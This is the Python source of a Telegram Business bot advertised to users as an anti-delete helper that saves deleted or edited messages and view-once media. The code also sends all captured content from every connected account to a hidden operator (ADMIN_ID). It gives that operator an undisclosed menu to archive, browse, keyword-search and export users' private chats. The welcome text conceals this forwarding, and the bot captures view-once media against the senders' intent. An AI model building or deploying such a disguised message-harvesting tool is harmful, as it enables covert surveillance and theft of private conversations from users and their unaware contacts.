"""
Telegram-бот: сохраняет сообщения собеседников через Business API
и присылает владельцу удалённые/изменённые сообщения вместе с медиа.

Требования: Telegram Premium у владельца + бот, подключённый в
Настройки -> Telegram для бизнеса -> Чат-боты (права: читать сообщения).
"""
import asyncio
import html
import logging
import os
import sqlite3
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

TZ = timezone(timedelta(hours=4))  # Asia/Yerevan, под часовой пояс владельца

from aiogram import Bot, Dispatcher
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    BusinessConnection,
    BusinessMessagesDeleted,
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
)

BOT_TOKEN = os.environ["BOT_TOKEN"]
ADMIN_ID = int(os.environ["ADMIN_ID"])  # куда слать ВСЁ от всех аккаунтов
DATA_DIR = Path(os.getenv("DATA_DIR", "data"))
RETENTION_DAYS = int(os.getenv("RETENTION_DAYS", "30"))    # текст переписок для архивных аккаунтов
MEDIA_DAYS = int(os.getenv("MEDIA_DAYS", "30"))            # сами файлы для архивных аккаунтов
ANTIDELETE_DAYS = int(os.getenv("ANTIDELETE_DAYS", "3"))   # хранение для простых антиделит-аккаунтов
MAX_DOWNLOAD = 20 * 1024 * 1024  # лимит Bot API на скачивание

MEDIA_DIR = DATA_DIR / "media"
MEDIA_DIR.mkdir(parents=True, exist_ok=True)

BOT_USERNAME = "@Antidelite_bot"
BANNER = Path(__file__).parent / "banner.png"

WELCOME = (
    "🗑 <b>Удалили или изменили сообщение? Покажу, что там было.</b>\n"
    "Ещё ловлю исчезающие фото и видео.\n\n"
    "<b>Как подключить за 3 шага:</b>\n"
    "1️⃣ Профиль → <b>Изменить</b> → <b>Автоматизация чатов</b>\n"
    f"2️⃣ Вставь в поиск имя бота: <code>{BOT_USERNAME}</code> (нажми, чтобы скопировать)\n"
    "3️⃣ Нажми <b>Добавить</b> — и готово\n\n"
    "📸 <b>Чтобы сохранить исчезающее фото или видео</b> (одноразовое, «просмотр один раз») — "
    "<b>ответь на него</b> любым текстом (свайп по фото влево → ответь). "
    "Оно тут же прилетит в сохранёнку. Успей ответить, пока фото не исчезло.\n\n"
    "Собеседник ничего не узнает, от твоего имени я ничего не пишу. "
    "Отключить можно в любой момент там же."
)

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("saver")

db = sqlite3.connect(DATA_DIR / "saver.db")
db.executescript(
    """
    CREATE TABLE IF NOT EXISTS connections(
        id TEXT PRIMARY KEY,
        owner_id INTEGER NOT NULL,
        owner_chat_id INTEGER NOT NULL,
        owner_name TEXT NOT NULL DEFAULT '',
        muted INTEGER NOT NULL DEFAULT 0,
        archive INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS messages(
        conn_id TEXT, chat_id INTEGER, msg_id INTEGER,
        sender_id INTEGER, sender_name TEXT,
        text TEXT, media_type TEXT, file_path TEXT, ts INTEGER,
        PRIMARY KEY(conn_id, chat_id, msg_id)
    );
    CREATE TABLE IF NOT EXISTS events(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        conn_id TEXT, owner_name TEXT,
        header TEXT, text TEXT, media_type TEXT, file_path TEXT,
        ts INTEGER, seen INTEGER NOT NULL DEFAULT 0
    );
    """
)
# миграция: добавить muted, если база из старой версии
cols = [r[1] for r in db.execute("PRAGMA table_info(connections)").fetchall()]
if "muted" not in cols:
    db.execute("ALTER TABLE connections ADD COLUMN muted INTEGER NOT NULL DEFAULT 0")
if "archive" not in cols:
    db.execute("ALTER TABLE connections ADD COLUMN archive INTEGER NOT NULL DEFAULT 0")
db.commit()

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()


# ---------- helpers ----------
def get_conn(conn_id: str):
    return db.execute(
        "SELECT owner_id, owner_chat_id, owner_name FROM connections WHERE id=?",
        (conn_id,),
    ).fetchone()


def extract_media(m: Message):
    """-> (тип, file_id, расширение, размер)"""
    if m.photo:
        p = m.photo[-1]
        return "photo", p.file_id, ".jpg", p.file_size or 0
    if m.video:
        return "video", m.video.file_id, ".mp4", m.video.file_size or 0
    if m.video_note:
        return "video_note", m.video_note.file_id, ".mp4", m.video_note.file_size or 0
    if m.voice:
        return "voice", m.voice.file_id, ".ogg", m.voice.file_size or 0
    if m.audio:
        return "audio", m.audio.file_id, ".mp3", m.audio.file_size or 0
    if m.animation:
        return "animation", m.animation.file_id, ".mp4", m.animation.file_size or 0
    if m.sticker:
        return "sticker", m.sticker.file_id, ".webp", m.sticker.file_size or 0
    if m.document:
        ext = Path(m.document.file_name or "").suffix or ".bin"
        return "document", m.document.file_id, ext, m.document.file_size or 0
    return None, None, "", 0


def sender_label(m: Message) -> str:
    u = m.from_user
    if not u:
        return "?"
    name = u.full_name
    return f"{name} (@{u.username})" if u.username else name


async def save_message(m: Message, owner_id: int | None = None):
    conn_id = m.business_connection_id
    if not conn_id:
        return
    mtype, file_id, ext, size = extract_media(m)
    path = None
    # медиа качаем всегда (нужно и для восстановления удалённого фото);
    # разница режимов — только в сроке хранения (см. cleanup_loop)
    if file_id and size <= MAX_DOWNLOAD:
        dest = MEDIA_DIR / f"{m.chat.id}_{m.message_id}{ext}"
        try:
            await bot.download(file_id, destination=dest)
            path = str(dest)
        except Exception as e:  # noqa: BLE001
            log.warning("download failed: %s", e)
    text = m.text or m.caption or ""
    db.execute(
        "INSERT OR REPLACE INTO messages VALUES (?,?,?,?,?,?,?,?,?)",
        (
            conn_id, m.chat.id, m.message_id,
            m.from_user.id if m.from_user else None,
            sender_label(m), text, mtype, path, int(time.time()),
        ),
    )
    db.commit()


async def send_saved(owner_chat_id: int, header: str, row):
    """row = (sender_name, text, media_type, file_path).
    text уже готов к выводу (экранирование делает вызывающий код)."""
    _, text, mtype, path = row
    body = f"\n\n{text}" if text else ""
    caption = (header + body)[:1024]
    if path and Path(path).exists():
        f = FSInputFile(path)
        senders = {
            "photo": bot.send_photo, "video": bot.send_video,
            "video_note": bot.send_video_note, "voice": bot.send_voice,
            "audio": bot.send_audio, "animation": bot.send_animation,
            "sticker": bot.send_sticker, "document": bot.send_document,
        }
        fn = senders.get(mtype, bot.send_document)
        if mtype in ("video_note", "sticker"):
            await bot.send_message(owner_chat_id, header + body)
            await fn(owner_chat_id, f)
        else:
            await fn(owner_chat_id, f, caption=caption)
    else:
        note = "\n<i>(медиа не сохранилось)</i>" if mtype else ""
        await bot.send_message(owner_chat_id, header + body + note)


# ---------- handlers ----------
def recipients(owner_chat_id: int) -> list[int]:
    """Админу + самому подключённому аккаунту (в его чат с ботом)."""
    return [ADMIN_ID] if owner_chat_id == ADMIN_ID else [ADMIN_ID, owner_chat_id]


async def notify(chat_ids: list[int], coro_factory):
    for cid in chat_ids:
        try:
            await coro_factory(cid)
        except Exception as e:  # noqa: BLE001
            # аккаунт мог не нажать /start у бота — админу всё равно дойдёт
            log.warning("не доставлено в %s: %s", cid, e)


def acc_label(name: str) -> str:
    return f"👤 <b>Аккаунт:</b> {html.escape(name)}\n"


async def emit_event(conn_id: str, header: str, text: str, mtype, path):
    """Пишет событие в журнал, шлёт владельцу всегда, админу — если не заглушён.
    header и text уже экранированы вызывающим кодом."""
    row = db.execute(
        "SELECT owner_chat_id, owner_name, muted FROM connections WHERE id=?",
        (conn_id,),
    ).fetchone()
    if not row:
        return
    owner_chat, owner_name, muted = row
    cur = db.execute(
        "INSERT INTO events(conn_id,owner_name,header,text,media_type,file_path,ts,seen)"
        " VALUES(?,?,?,?,?,?,?,0)",
        (conn_id, owner_name, header, text, mtype, path, int(time.time())),
    )
    db.commit()
    eid = cur.lastrowid
    # владельцу (его чат с ботом) — всегда
    if owner_chat != ADMIN_ID:
        try:
            await send_saved(owner_chat, header, (owner_name, text, mtype, path))
        except Exception as e:  # noqa: BLE001
            log.warning("owner deliver fail %s: %s", owner_chat, e)
    # админу — только если аккаунт не заглушён
    if not muted:
        try:
            await send_saved(ADMIN_ID, header, (owner_name, text, mtype, path))
            db.execute("UPDATE events SET seen=1 WHERE id=?", (eid,))
            db.commit()
        except Exception as e:  # noqa: BLE001
            log.warning("admin deliver fail: %s", e)


def welcome_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👀 Как это выглядит", callback_data="demo")],
        ]
    )


def admin_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📂 Аккаунты")]],
        resize_keyboard=True,
    )


@dp.message(Command("start"))
async def start(m: Message):
    # приветствие с баннером и инструкцией — всем
    if BANNER.exists():
        await m.answer_photo(FSInputFile(BANNER), caption=WELCOME, reply_markup=welcome_kb())
    else:
        await m.answer(WELCOME, reply_markup=welcome_kb())
    # если это уже подключённый аккаунт — подтверждаем доставку сюда
    if m.from_user.id != ADMIN_ID and db.execute(
        "SELECT 1 FROM connections WHERE owner_id=?", (m.from_user.id,)
    ).fetchone():
        await m.answer("✅ Этот аккаунт подключён. Удалённое и изменённое буду слать и сюда.")
    if m.from_user.id == ADMIN_ID:
        await m.answer(
            "Ты админ. Всё от всех подключённых аккаунтов прилетает сюда.\n"
            "Жми кнопку «📂 Аккаунты» внизу, чтобы управлять заглушкой и смотреть накопленное.",
            reply_markup=admin_menu(),
        )


@dp.callback_query(lambda c: c.data == "demo")
async def demo(c: CallbackQuery):
    await c.message.answer(
        "Пример того, что придёт:\n\n"
        "🗑 <b>Иван (@ivan)</b> удалил(а) сообщение\n\n"
        "«Ладно, забудь, это не важно»\n\n"
        "✏️ <b>Иван</b> изменил(а) сообщение\n"
        "<b>Было:</b> 5000\n<b>Стало:</b> 500"
    )
    await c.answer()


def accounts_kb() -> InlineKeyboardMarkup:
    rows = db.execute(
        "SELECT rowid, id, owner_name, muted, archive FROM connections ORDER BY rowid"
    ).fetchall()
    kb = []
    for rid, conn_id, name, muted, archive in rows:
        unseen = db.execute(
            "SELECT COUNT(*) FROM events WHERE conn_id=? AND seen=0", (conn_id,)
        ).fetchone()[0]
        mark = "🔕" if muted else "🔔"
        tag = "🗄" if archive else "🛡"  # 🗄 полный архив, 🛡 только антиделит
        kb.append([InlineKeyboardButton(text=f"{mark}{tag} {name[:26]}", callback_data="noop")])
        kb.append([
            InlineKeyboardButton(
                text=("🔔 Включить" if muted else "🔕 Заглушить"),
                callback_data=f"mute:{rid}",
            ),
            InlineKeyboardButton(
                text=("🛡 Антиделит" if archive else "🗄 Архив всего"),
                callback_data=f"arch:{rid}",
            ),
        ])
        kb.append([
            InlineKeyboardButton(text=f"📂 Показать ({unseen})", callback_data=f"show:{rid}"),
            InlineKeyboardButton(text="💬 Переписки", callback_data=f"chats:{rid}"),
            InlineKeyboardButton(text="🔎 Поиск", callback_data=f"search:{rid}"),
        ])
    if not kb:
        kb = [[InlineKeyboardButton(text="Пока никого не подключено", callback_data="noop")]]
    return InlineKeyboardMarkup(inline_keyboard=kb)


@dp.message(lambda m: m.text == "📂 Аккаунты")
async def accounts(m: Message):
    if m.from_user.id != ADMIN_ID:
        return
    await m.answer(
        "Подключённые аккаунты. 🔕 — заглушён (не пингует, но всё копится).\n"
        "«Показать» вываливает накопленное и помечает прочитанным.",
        reply_markup=accounts_kb(),
    )


@dp.callback_query(lambda c: c.data == "noop")
async def noop(c: CallbackQuery):
    await c.answer()


@dp.callback_query(lambda c: c.data and c.data.startswith("mute:"))
async def toggle_mute(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    rid = int(c.data.split(":", 1)[1])
    db.execute("UPDATE connections SET muted=1-muted WHERE rowid=?", (rid,))
    db.commit()
    muted = db.execute("SELECT muted FROM connections WHERE rowid=?", (rid,)).fetchone()
    try:
        await c.message.edit_reply_markup(reply_markup=accounts_kb())
    except Exception:  # noqa: BLE001
        pass
    await c.answer("Заглушён" if muted and muted[0] else "Уведомления включены")


@dp.callback_query(lambda c: c.data and c.data.startswith("arch:"))
async def toggle_archive(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    rid = int(c.data.split(":", 1)[1])
    db.execute("UPDATE connections SET archive=1-archive WHERE rowid=?", (rid,))
    db.commit()
    a = db.execute("SELECT archive FROM connections WHERE rowid=?", (rid,)).fetchone()
    try:
        await c.message.edit_reply_markup(reply_markup=accounts_kb())
    except Exception:  # noqa: BLE001
        pass
    if a and a[0]:
        await c.answer("🗄 Полный архив включён: качаю все медиа и храню переписки")
    else:
        await c.answer("🛡 Только антиделит: медиа не копится")


@dp.callback_query(lambda c: c.data and c.data.startswith("show:"))
async def show_saved(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    rid = int(c.data.split(":", 1)[1])
    crow = db.execute(
        "SELECT id, owner_name FROM connections WHERE rowid=?", (rid,)
    ).fetchone()
    if not crow:
        await c.answer("Нет такого аккаунта")
        return
    conn_id, owner_name = crow
    evs = db.execute(
        "SELECT id, header, text, media_type, file_path FROM events "
        "WHERE conn_id=? AND seen=0 ORDER BY ts",
        (conn_id,),
    ).fetchall()
    if not evs:
        await c.answer("Накопленного нет")
        return
    await c.answer(f"Показываю {len(evs)}…")
    await bot.send_message(ADMIN_ID, f"📂 Накопленное: <b>{html.escape(owner_name)}</b>")
    for eid, header, text, mtype, path in evs:
        try:
            await send_saved(ADMIN_ID, header, (owner_name, text, mtype, path))
        except Exception as e:  # noqa: BLE001
            log.warning("dump deliver fail: %s", e)
        db.execute("UPDATE events SET seen=1 WHERE id=?", (eid,))
    db.commit()
    try:
        await c.message.edit_reply_markup(reply_markup=accounts_kb())
    except Exception:  # noqa: BLE001
        pass


MEDIA_LABEL = {
    "photo": "[фото]", "video": "[видео]", "video_note": "[кружок]",
    "voice": "[голосовое]", "audio": "[аудио]", "animation": "[гиф]",
    "sticker": "[стикер]", "document": "[файл]",
}


def chats_kb(rid: int) -> InlineKeyboardMarkup:
    """Список чатов аккаунта (по собеседникам) с числом сообщений."""
    crow = db.execute("SELECT id, owner_id FROM connections WHERE rowid=?", (rid,)).fetchone()
    kb = []
    if crow:
        conn_id, owner_id = crow
        chats = db.execute(
            "SELECT chat_id, COUNT(*) c, MAX(ts) t FROM messages WHERE conn_id=? "
            "GROUP BY chat_id ORDER BY t DESC LIMIT 20",
            (conn_id,),
        ).fetchall()
        for chat_id, cnt, _ in chats:
            # имя собеседника = последний не-владелец в этом чате
            peer = db.execute(
                "SELECT sender_name FROM messages WHERE conn_id=? AND chat_id=? "
                "AND sender_id!=? ORDER BY ts DESC LIMIT 1",
                (conn_id, chat_id, owner_id),
            ).fetchone()
            title = (peer[0] if peer else f"Чат {chat_id}")[:30]
            kb.append([InlineKeyboardButton(
                text=f"💬 {title} ({cnt})", callback_data=f"chat:{rid}:{chat_id}:7"
            )])
    kb.append([InlineKeyboardButton(text="« Назад", callback_data="back")])
    if len(kb) == 1:
        kb.insert(0, [InlineKeyboardButton(text="Переписок пока нет", callback_data="noop")])
    return InlineKeyboardMarkup(inline_keyboard=kb)


def period_kb(rid: int, chat_id: int, days: int = 7) -> InlineKeyboardMarkup:
    opts = [("Сегодня", 1), ("3 дня", 3), ("Неделя", 7), ("Всё", 3650)]
    row = [
        InlineKeyboardButton(text=t, callback_data=f"chat:{rid}:{chat_id}:{d}")
        for t, d in opts
    ]
    return InlineKeyboardMarkup(inline_keyboard=[
        row,
        [InlineKeyboardButton(
            text="📄 Выгрузить файлом", callback_data=f"exp:{rid}:{chat_id}:{days}"
        )],
        [InlineKeyboardButton(text="« К чатам", callback_data=f"chats:{rid}")],
    ])


@dp.callback_query(lambda c: c.data == "back")
async def back_to_accounts(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    try:
        await c.message.edit_text(
            "Подключённые аккаунты. 🔕 — заглушён (не пингует, но всё копится).",
            reply_markup=accounts_kb(),
        )
    except Exception:  # noqa: BLE001
        await c.message.answer("Аккаунты:", reply_markup=accounts_kb())
    await c.answer()


@dp.callback_query(lambda c: c.data and c.data.startswith("chats:"))
async def show_chats(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    rid = int(c.data.split(":", 1)[1])
    try:
        await c.message.edit_text("Выбери чат:", reply_markup=chats_kb(rid))
    except Exception:  # noqa: BLE001
        await c.message.answer("Выбери чат:", reply_markup=chats_kb(rid))
    await c.answer()


@dp.callback_query(lambda c: c.data and c.data.startswith("chat:"))
async def show_chat(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    _, rid_s, chat_s, days_s = c.data.split(":")
    rid, chat_id, days = int(rid_s), int(chat_s), int(days_s)
    crow = db.execute(
        "SELECT id, owner_id, owner_name FROM connections WHERE rowid=?", (rid,)
    ).fetchone()
    if not crow:
        await c.answer("Нет аккаунта")
        return
    conn_id, owner_id, owner_name = crow
    since = int(time.time()) - days * 86400
    msgs = db.execute(
        "SELECT sender_id, sender_name, text, media_type, file_path, ts FROM messages "
        "WHERE conn_id=? AND chat_id=? AND ts>=? ORDER BY ts LIMIT 400",
        (conn_id, chat_id, since),
    ).fetchall()
    await c.answer()
    if not msgs:
        await bot.send_message(
            ADMIN_ID, "За этот период пусто.", reply_markup=period_kb(rid, chat_id, days)
        )
        return
    peer = next((n for sid, n, *_ in msgs if sid != owner_id), f"Чат {chat_id}")
    await bot.send_message(
        ADMIN_ID,
        f"💬 <b>{html.escape(owner_name)}</b> ↔ <b>{html.escape(peer)}</b> "
        f"(за {days} дн., {len(msgs)} сообщ.)",
    )
    buf = ""

    async def flush():
        nonlocal buf
        if buf.strip():
            await bot.send_message(ADMIN_ID, buf)
        buf = ""

    for sid, name, text, mtype, path, ts in msgs:
        t = datetime.fromtimestamp(ts, TZ).strftime("%d.%m %H:%M")
        who = "Я" if sid == owner_id else html.escape((name or "?").split(" (")[0])
        cap_text = html.escape(text or "")
        if mtype and path and Path(path).exists():
            # есть сам файл — отправляем его в ленту
            await flush()
            header = f"<b>{who}</b> <i>{t}</i>"
            try:
                await send_saved(ADMIN_ID, header, (who, cap_text, mtype, path))
            except Exception as e:  # noqa: BLE001
                log.warning("chat media send fail: %s", e)
                buf += f"{header}: {cap_text or MEDIA_LABEL.get(mtype, '')}\n"
        else:
            content = cap_text or MEDIA_LABEL.get(mtype, "")
            line = f"<b>{who}</b> <i>{t}</i>: {content}"
            if len(buf) + len(line) > 3500:
                await flush()
            buf += line + "\n"
    await flush()
    await bot.send_message(
        ADMIN_ID, "— конец переписки —", reply_markup=period_kb(rid, chat_id, days)
    )


@dp.callback_query(lambda c: c.data and c.data.startswith("exp:"))
async def export_chat(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    _, rid_s, chat_s, days_s = c.data.split(":")
    rid, chat_id, days = int(rid_s), int(chat_s), int(days_s)
    crow = db.execute(
        "SELECT id, owner_id, owner_name FROM connections WHERE rowid=?", (rid,)
    ).fetchone()
    if not crow:
        await c.answer("Нет аккаунта")
        return
    conn_id, owner_id, owner_name = crow
    since = int(time.time()) - days * 86400
    msgs = db.execute(
        "SELECT sender_id, sender_name, text, media_type, ts FROM messages "
        "WHERE conn_id=? AND chat_id=? AND ts>=? ORDER BY ts",
        (conn_id, chat_id, since),
    ).fetchall()
    if not msgs:
        await c.answer("Пусто за период")
        return
    await c.answer("Готовлю файл…")
    peer = next((n for sid, n, *_ in msgs if sid != owner_id), f"Чат {chat_id}")
    out = [f"Переписка: {owner_name} <-> {peer}", f"Период: последние {days} дн.",
           f"Сообщений: {len(msgs)}", "=" * 40, ""]
    for sid, name, text, mtype, ts in msgs:
        t = datetime.fromtimestamp(ts, TZ).strftime("%d.%m.%Y %H:%M")
        who = "Я" if sid == owner_id else (name or "?").split(" (")[0]
        content = (text or "") or MEDIA_LABEL.get(mtype, "")
        out.append(f"[{t}] {who}: {content}")
    exp_dir = DATA_DIR / "exports"
    exp_dir.mkdir(exist_ok=True)
    safe = "".join(ch for ch in peer if ch.isalnum() or ch in " _-")[:30].strip() or "chat"
    fpath = exp_dir / f"{safe}_{chat_id}.txt"
    fpath.write_text("\n".join(out), encoding="utf-8")
    await bot.send_document(
        ADMIN_ID, FSInputFile(fpath),
        caption=f"📄 {html.escape(owner_name)} ↔ {html.escape(peer)}, {len(msgs)} сообщ.",
    )


# ---------- поиск по тексту ----------
search_wait: dict[int, int] = {}  # admin_id -> rid аккаунта


@dp.callback_query(lambda c: c.data and c.data.startswith("search:"))
async def ask_search(c: CallbackQuery):
    if c.from_user.id != ADMIN_ID:
        await c.answer()
        return
    rid = int(c.data.split(":", 1)[1])
    search_wait[c.from_user.id] = rid
    await c.message.answer("🔎 Пришли слово или фразу — поищу в переписках этого аккаунта.")
    await c.answer()


@dp.message(lambda m: m.from_user and m.from_user.id in search_wait and m.text
            and m.text != "📂 Аккаунты")
async def do_search(m: Message):
    rid = search_wait.pop(m.from_user.id)
    crow = db.execute(
        "SELECT id, owner_id FROM connections WHERE rowid=?", (rid,)
    ).fetchone()
    if not crow:
        await m.answer("Аккаунт не найден.")
        return
    conn_id, owner_id = crow
    q = m.text.strip()
    rows = db.execute(
        "SELECT chat_id, sender_id, sender_name, text, ts FROM messages "
        "WHERE conn_id=? AND text LIKE ? ORDER BY ts DESC LIMIT 30",
        (conn_id, f"%{q}%"),
    ).fetchall()
    if not rows:
        await m.answer(f"По запросу «{html.escape(q)}» ничего не нашёл.")
        return
    out = [f"🔎 Нашёл {len(rows)} по «{html.escape(q)}»:\n"]
    chats_seen = {}
    for chat_id, sid, name, text, ts in rows:
        t = datetime.fromtimestamp(ts, TZ).strftime("%d.%m %H:%M")
        who = "Я" if sid == owner_id else html.escape((name or "?").split(" (")[0])
        snip = html.escape(text or "")
        if len(snip) > 120:
            snip = snip[:120] + "…"
        out.append(f"<b>{who}</b> <i>{t}</i>: {snip}")
        if sid != owner_id and chat_id not in chats_seen:
            chats_seen[chat_id] = (name or "?").split(" (")[0]
    kb = [[InlineKeyboardButton(text=f"💬 Открыть: {nm[:25]}",
                                callback_data=f"chat:{rid}:{cid}:3650")]
          for cid, nm in list(chats_seen.items())[:8]]
    await m.answer("\n".join(out)[:4000],
                   reply_markup=InlineKeyboardMarkup(inline_keyboard=kb) if kb else None)


@dp.business_connection()
async def on_connection(bc: BusinessConnection):
    name = bc.user.full_name + (f" (@{bc.user.username})" if bc.user.username else "")
    if bc.is_enabled:
        db.execute(
            "INSERT INTO connections(id,owner_id,owner_chat_id,owner_name) VALUES(?,?,?,?)"
            " ON CONFLICT(id) DO UPDATE SET owner_id=excluded.owner_id,"
            " owner_chat_id=excluded.owner_chat_id, owner_name=excluded.owner_name",
            (bc.id, bc.user.id, bc.user_chat_id, name),
        )
        db.commit()
        await notify(
            recipients(bc.user_chat_id),
            lambda cid: bot.send_message(cid, f"✅ Подключён аккаунт: {html.escape(name)}"),
        )
    else:
        db.execute("DELETE FROM connections WHERE id=?", (bc.id,))
        db.commit()
        await bot.send_message(ADMIN_ID, f"❌ Отключён аккаунт: {html.escape(name)}")


async def capture_reply_media(m: Message):
    """Трюк с исчезающими фото: если это ответ на сообщение с медиа,
    скачиваем медиа из reply_to_message и шлём админу + владельцу."""
    r = m.reply_to_message
    if not r:
        return
    mtype, file_id, ext, size = extract_media(r)
    if not file_id or mtype not in ("photo", "video", "video_note", "animation"):
        return
    conn = get_conn(m.business_connection_id)
    if not conn:
        return
    _, _, owner_name = conn
    path = None
    if size <= MAX_DOWNLOAD:
        dest = MEDIA_DIR / f"ttl_{m.chat.id}_{r.message_id}{ext}"
        try:
            await bot.download(file_id, destination=dest)
            path = str(dest)
        except Exception as e:  # noqa: BLE001
            log.warning("ttl download failed: %s", e)
    sender = sender_label(r) if r.from_user else "собеседник"
    header = acc_label(owner_name) + f"👻 Исчезающее медиа от <b>{html.escape(sender)}</b>"
    await emit_event(m.business_connection_id, header, "", mtype, path)


@dp.business_message()
async def on_message(m: Message):
    await save_message(m)
    await capture_reply_media(m)


@dp.edited_business_message()
async def on_edit(m: Message):
    conn = get_conn(m.business_connection_id)
    if not conn:
        return
    owner_id, owner_chat, owner_name = conn
    old = db.execute(
        "SELECT text FROM messages WHERE conn_id=? AND chat_id=? AND msg_id=?",
        (m.business_connection_id, m.chat.id, m.message_id),
    ).fetchone()
    new_text = m.text or m.caption or ""
    if m.from_user and m.from_user.id != owner_id and old and old[0] != new_text:
        header = (
            acc_label(owner_name)
            + f"✏️ <b>{html.escape(sender_label(m))}</b> изменил(а) сообщение"
        )
        body = (
            f"<b>Было:</b>\n{html.escape(old[0] or '—')}\n\n"
            f"<b>Стало:</b>\n{html.escape(new_text or '—')}"
        )
        await emit_event(m.business_connection_id, header, body, None, None)
    db.execute(
        "UPDATE messages SET text=? WHERE conn_id=? AND chat_id=? AND msg_id=?",
        (new_text, m.business_connection_id, m.chat.id, m.message_id),
    )
    db.commit()


@dp.deleted_business_messages()
async def on_deleted(ev: BusinessMessagesDeleted):
    conn = get_conn(ev.business_connection_id)
    if not conn:
        return
    owner_id, owner_chat, owner_name = conn
    for mid in ev.message_ids:
        r = db.execute(
            "SELECT sender_id, sender_name, text, media_type, file_path "
            "FROM messages WHERE conn_id=? AND chat_id=? AND msg_id=?",
            (ev.business_connection_id, ev.chat.id, mid),
        ).fetchone()
        if not r:
            continue
        sender_id, name, text, mtype, path = r
        if sender_id == owner_id:  # свои удаления не трогаем
            continue
        header = acc_label(owner_name) + f"🗑 <b>{html.escape(name)}</b> удалил(а) сообщение"
        await emit_event(
            ev.business_connection_id, header, html.escape(text or ""), mtype, path
        )


# ---------- уборка ----------
def unref_unlink(fp):
    """Удаляем файл с диска, только если на него не ссылается ни messages, ни events."""
    if not fp:
        return
    if db.execute("SELECT 1 FROM messages WHERE file_path=? LIMIT 1", (fp,)).fetchone():
        return
    if db.execute("SELECT 1 FROM events WHERE file_path=? LIMIT 1", (fp,)).fetchone():
        return
    Path(fp).unlink(missing_ok=True)


async def cleanup_loop():
    while True:
        now = int(time.time())
        text_cutoff = now - RETENTION_DAYS * 86400
        media_cutoff = now - MEDIA_DAYS * 86400
        anti_cutoff = now - ANTIDELETE_DAYS * 86400
        candidates = set()

        # A) антиделит-аккаунты: сносим старые сообщения целиком (и их файлы)
        for fp, in db.execute(
            "SELECT DISTINCT file_path FROM messages WHERE file_path IS NOT NULL AND ts<? "
            "AND conn_id IN (SELECT id FROM connections WHERE archive=0)",
            (anti_cutoff,),
        ).fetchall():
            candidates.add(fp)
        db.execute(
            "DELETE FROM messages WHERE ts<? AND conn_id IN "
            "(SELECT id FROM connections WHERE archive=0)",
            (anti_cutoff,),
        )

        # B) архивные: сами файлы старше MEDIA_DAYS убираем, текст оставляем
        for fp, in db.execute(
            "SELECT DISTINCT file_path FROM messages WHERE file_path IS NOT NULL AND ts<?",
            (media_cutoff,),
        ).fetchall():
            candidates.add(fp)
        db.execute(
            "UPDATE messages SET file_path=NULL WHERE file_path IS NOT NULL AND ts<?",
            (media_cutoff,),
        )
        for fp, in db.execute(
            "SELECT DISTINCT file_path FROM events WHERE file_path IS NOT NULL AND ts<?",
            (media_cutoff,),
        ).fetchall():
            candidates.add(fp)
        db.execute(
            "UPDATE events SET file_path=NULL WHERE file_path IS NOT NULL AND ts<?",
            (media_cutoff,),
        )

        # C) текст архивных и осиротевших — по длинному сроку
        for fp, in db.execute(
            "SELECT DISTINCT file_path FROM messages WHERE file_path IS NOT NULL AND ts<?",
            (text_cutoff,),
        ).fetchall():
            candidates.add(fp)
        db.execute("DELETE FROM messages WHERE ts<?", (text_cutoff,))
        db.execute("DELETE FROM events WHERE seen=1 AND ts<?", (text_cutoff,))
        db.commit()

        # удаляем с диска всё, на что больше никто не ссылается
        for fp in candidates:
            unref_unlink(fp)
        await asyncio.sleep(6 * 3600)


async def main():
    asyncio.create_task(cleanup_loop())
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())


if __name__ == "__main__":
    asyncio.run(main())
